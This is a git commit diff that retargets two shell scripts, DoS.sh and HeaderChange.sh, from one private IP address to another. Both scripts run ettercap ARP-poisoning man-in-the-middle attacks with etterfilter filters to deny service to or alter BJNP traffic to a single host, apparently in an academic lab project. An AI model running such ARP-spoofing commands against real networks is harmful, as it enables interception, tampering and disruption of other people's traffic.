7d779db1ae50ba81113fc25cf1f3e46d0f043330
Veronica Herzog <vherzog@bu.edu>
2017-12-08 22:09:47 -0500

    minor fixes

--- scripts/DoS.sh
+++ scripts/DoS.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 sudo etterfilter ip_DoS.filter -o ip_DoS.ef
-sudo ettercap -Tq -F ip_DoS.ef -M arp:remote /10.0.0.109/ //
+sudo ettercap -Tq -F ip_DoS.ef -M arp:remote /192.168.1.109/ //
--- scripts/HeaderChange.sh
+++ scripts/HeaderChange.sh
@@ -3,4 +3,4 @@ sudo rm /tmp/BJNP_Header.log
 sudo rm /tmp/BJNP_Header_Change.log
 sudo etterfilter ip_change_header.filter -o ip_change_header.ef
 
-sudo ettercap -Tq -F ip_change_header.ef -M arp:remote /10.0.0.109/ //
+sudo ettercap -Tq -F ip_change_header.ef -M arp:remote /192.168.1.109/ //
